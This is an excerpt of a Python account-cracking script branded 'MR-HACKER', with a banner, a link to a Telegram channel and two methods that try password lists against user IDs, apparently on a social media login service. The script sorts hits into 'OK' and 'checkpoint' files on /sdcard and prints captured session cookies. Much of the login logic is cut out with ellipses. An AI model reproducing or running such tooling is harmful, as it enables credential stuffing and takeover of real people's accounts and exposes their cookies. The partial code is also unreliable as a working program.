...
logo = (
    f"{O}
  __  __ _____        _    _          _____ _  ________ _____  
 |  \/  |  __ \      | |  | |   /\   / ____| |/ /  ____|  __ \ 
 | \  / | |__) |_____| |__| |  /  \ | |    | ' /| |__  | |__) |
 | |\/| |  _  /______|  __  | / /\ \| |    |  < |  __| |  _  / 
 | |  | | | \ \      | |  | |/ ____ \ |____| . \| |____| | \ \ 
 |_|  |_|_|  \_\     |_|  |_/_/    \_\_____|_|\_\______|_|  \_\                                                           
    f" 
    f" 
    f" 
    f" 
...
def SIAM():
    ...
    if ___option___ == '1': 
        os.system('xdg-open https://t.me/DARKCYBER40') 
        poco.append('1')
...
def ____methodA____(ids, pasx, tl_unused): # tl is passed but not used meaningfully inside
    ...
    sys.stdout.write(f'\r\r{G}<[MR-HACKER]> <[M-1]> {loop} | OK|CP {ok} | {cp}{G}') # Assuming ok, cp are integers
    sys.stdout.flush()
    ...
    for pw in pasx:
        try:
            ...
            if 'checkpoint' in response_cookies:
                ...
                print(f'\r{xd}-{R}[{Y}MR-HACKER-CP{R}]{Y} {uid} | {pw} ')
                with open('/sdcard/MR-HACKER-M1-RANDOM-CP.txt', 'a') as f:
                    f.write(f'{uid}|{pw}\n')
                cp += 1
                ...
                print(f'\r{xd}-{R}[{G}MR-HACKER-OK{R}]{G} {uid} | {pw} ')
                print(f'\r{R}[💥{R}]{G} {kuki} ') # Cookie print
                print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                with open('/sdcard/MR-HACKER-M1-RANDOM-OK.txt', 'a') as f:
...
def ____methodB____(ids, pasx, tl_unused): # tl is passed but not used meaningfully inside
    global loop, ok, cp 
    sys.stdout.write(f'\r\r{G}<[MR-HACKER]> <[M-2]> {loop} | OK|CP {len(ok)} | {len(cp)}{G}')
    sys.stdout.flush()
    ...
    for pw in pasx:
        try:
            ...
            if 'session_key' in po:
                ...
                print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                with open('/sdcard/MR-HACKER-M2-RANDOM-OK.txt', 'a') as f:
